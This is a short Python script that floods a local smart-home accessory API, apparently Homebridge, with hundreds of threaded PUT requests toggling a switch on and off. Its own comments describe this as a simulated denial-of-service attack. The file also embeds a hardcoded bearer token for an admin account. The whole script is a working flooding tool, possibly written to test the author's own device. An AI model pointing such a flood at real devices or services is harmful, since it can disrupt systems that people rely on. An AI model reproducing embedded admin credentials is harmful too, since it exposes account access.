import requests
import threading
import time

# URL to toggle the switch
url = 'http://localhost:8581/api/accessories/48355461c344c5eea73e51d7281e793fec90f438697d6ba4a4aa3fa7f8f0a87c'

# Headers (with Authorization)
headers = {
    'accept': '*/*',
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNoaWx1dmVsbyIsIm5hbWUiOiJTaGlsdXZlbG8iLCJhZG1pbiI6dHJ1ZSwiaW5zdGFuY2VJZCI6IjE4Zjg0YzgxZWM5M2IyMzY3ZWFhNzQzZDhmZGJiOThjMzg1NzM2ZDUxMmUxMjY4ODc5MTgxNWVkNmMwNTk2MjMiLCJpYXQiOjE3Mjg1NTM2NzksImV4cCI6MTcyODU4MjQ3OX0.sAnnWLsqdFUyMgwjyOu9v8cYr0ICn1hI4sd8dAcak7E',
    'Content-Type': 'application/json'
}

# Payload to toggle switch ON and OFF
payload_on = {
    "characteristicType": "On",
    "value": "1"  # Turn switch ON
}

payload_off = {
    "characteristicType": "On",
    "value": "0"  # Turn switch OFF
}

# Function to send requests to toggle the switch ON or OFF
def toggle_switch(payload):
    try:
        response = requests.put(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(f"Switch toggled to {'ON' if payload['value'] == '1' else 'OFF'}")
        else:
            print(f"Failed to toggle switch: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error toggling switch: {str(e)}")

# Function to simulate a DoS attack by sending multiple requests
def start_dos_attack():
    num_threads = 250  # Adjust the number of threads as needed to increase load

    for _ in range(num_threads):
        # Toggle between ON and OFF
        thread_on = threading.Thread(target=toggle_switch, args=(payload_on,))
        thread_off = threading.Thread(target=toggle_switch, args=(payload_off,))

        # Start both threads
        thread_on.start()
        thread_off.start()

        # Delay to simulate continuous load over time
        time.sleep(0.01)

if __name__ == "__main__":
    start_dos_attack()
